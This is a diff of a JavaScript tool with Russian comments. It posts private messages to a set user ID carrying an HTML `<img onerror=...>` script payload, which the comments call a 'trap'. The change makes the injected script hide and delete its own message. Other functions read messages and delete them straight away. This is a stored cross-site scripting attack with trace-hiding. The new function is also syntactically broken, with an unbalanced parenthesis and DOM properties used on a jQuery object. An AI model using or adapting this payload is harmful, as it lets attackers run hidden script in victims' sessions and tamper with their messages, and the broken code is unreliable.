@@ -7,7 +7,7 @@ const IMAGE_SRC = '1';
 const userID = 97130;
 const genData = (title, message) => `idinfo=0&item=0&title=${title}&mes_otvet=${message}&adresat=${userID}&saveotv`;
 // Данные, которые нужны для удаления сообщения с ловушкой
-const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} style=display:none height=0 onerror=delMsg(jQuery(this).parent().parent().id.replace('tr_',''))>`, miden);
+const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} height=0 onerror=gead(jQuery(this))>`, miden);
 
 
 function set_Cookie(name, value, expires, path, domain, secure) {
@@ -52,4 +52,11 @@ function get_n_clear(id){
     // Читает сообщение id и сразу его удаляет
     let a = $.post(MESSAGE_LINK_2, data="id="+id+"&prosmotr")
     setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMsg(id) }, 1000)
+}
+
+function gead(el) {
+    const wrapper = el.parent().parent());
+    wrapper.style.display = 'none';
+    console.log(wrapper);
+    delMsg(wrapper.id.replace('tr_',''));
 }
